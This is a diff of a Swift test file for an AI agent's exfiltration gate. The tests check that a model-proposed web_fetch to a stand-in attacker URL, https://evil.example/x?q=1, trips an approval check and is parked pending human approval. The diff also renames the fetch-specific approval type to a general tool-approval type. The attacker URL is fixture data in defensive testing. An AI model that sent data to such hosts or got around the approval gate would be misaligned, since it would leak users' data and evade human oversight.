@@ -95,7 +95,7 @@ import Testing
       sessionId: fixture.sessionId,
       chatId: 7,
       triggerMessageId: fixture.triggerMessageId,
-      fetchGrant: nil
+      grant: nil
     )
 
     // then — reply delivered; exchange rows + taint persisted (REOPEN the DB to assert, §17-1)
@@ -117,7 +117,10 @@ import Testing
 
   @Test func pendingApprovalAppendsPromptAfterReplyAndParks() async throws {
     // given — the gate trips; the model wraps up (D7)
-    let approval = ExfilApprovalRequest(canonicalURL: "https://evil.example/x?q=1")
+    let approval = ToolApprovalRequest(
+      action: ToolAction(tool: "web_fetch", target: "https://evil.example/x?q=1"),
+      reason: .exfilTrifecta
+    )
     let fixture = try makeFixture(
       provider: SequenceProvider([
         toolCallResponse([fetchProposal(url: "https://evil.example/x?q=1")]),
@@ -144,7 +147,7 @@ import Testing
       sessionId: fixture.sessionId,
       chatId: 7,
       triggerMessageId: fixture.triggerMessageId,
-      fetchGrant: nil
+      grant: nil
     )
 
     // then — the prompt is APPENDED after the model's explanation (rev.1 L1), full URL included
@@ -157,7 +160,9 @@ import Testing
     // and the entry is parked; the blocked exchange is persisted history (§9.2 re-proposal
     // substrate). Decode the `tool_calls` column and match the canonical URL against the decoded
     // arguments — decode-based matching stays robust regardless of the encoder's escaping policy.
-    #expect(await fixture.registry.pending(sessionId: fixture.sessionId) == .exfilFetch(approval))
+    #expect(
+      await fixture.registry.pending(sessionId: fixture.sessionId) == .toolApproval(approval)
+    )
     let snapshot = try fixture.stores.sessionMessages.loadContextSnapshot(
       sessionId: fixture.sessionId,
       throughMessageId: Int64.max,
@@ -203,7 +208,7 @@ import Testing
       sessionId: fixture.sessionId,
       chatId: 7,
       triggerMessageId: fixture.triggerMessageId,
-      fetchGrant: nil
+      grant: nil
     )
 
     // then — the run FAILED with the named-cap reply (`Degradation.budget(cap:)`), and the taint
